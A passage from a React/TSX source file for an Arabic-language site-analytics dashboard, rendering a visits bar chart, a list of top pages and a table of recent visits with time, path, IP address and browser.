                <Bar dataKey="visits" fill="var(--primary)" radius={[4, 4, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </CardContent>
      </Card>

      <div className="grid gap-6 lg:grid-cols-2">
        <Card>
          <CardHeader>
            <CardTitle className="text-base">الصفحات الأكثر زيارة</CardTitle>
          </CardHeader>
          <CardContent>
            {stats.topPages.length === 0 ? (
              <p className="text-sm text-muted-foreground">لا توجد زيارات بعد.</p>
            ) : (
              <ul className="space-y-3">
                {stats.topPages.map((page) => (
                  <li key={page.path} className="flex items-center justify-between gap-4">
                    <span className="truncate text-sm text-foreground" dir="ltr">
                      {page.path}
                    </span>
                    <span className="shrink-0 rounded-md bg-muted px-2 py-0.5 text-sm font-medium text-foreground">
                      {page.visits.toLocaleString("ar-JO")}
                    </span>
                  </li>
                ))}
              </ul>
            )}
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle className="text-base">أحدث الزيارات</CardTitle>
          </CardHeader>
          <CardContent className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>الوقت</TableHead>
                  <TableHead>الصفحة</TableHead>
                  <TableHead>عنوان IP</TableHead>
                  <TableHead>المتصفح</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {stats.recentVisits.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={4} className="text-center text-muted-foreground">
                      لا توجد زيارات بعد.
                    </TableCell>
                  </TableRow>
                ) : (
                  stats.recentVisits.map((visit) => (
                    <TableRow key={visit.id}>
                      <TableCell className="whitespace-nowrap text-xs text-muted-foreground">
                        {format(new Date(visit.created_at), "d MMM، h:mm a", { locale: ar })}
                      </TableCell>
                      <TableCell className="max-w-32 truncate text-sm" dir="ltr">
                        {visit.path}
                      </TableCell>
                      <TableCell className="whitespace-nowrap text-sm" dir="ltr">
                        {visit.ip ?? "—"}
                      </TableCell>
                      <TableCell
                        className="max-w-40 truncate text-xs text-muted-foreground"
                        dir="ltr"
                      >
                        {visit.user_agent ?? "—"}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </CardContent>
        </Card>
      </div>
    </>
  );
}
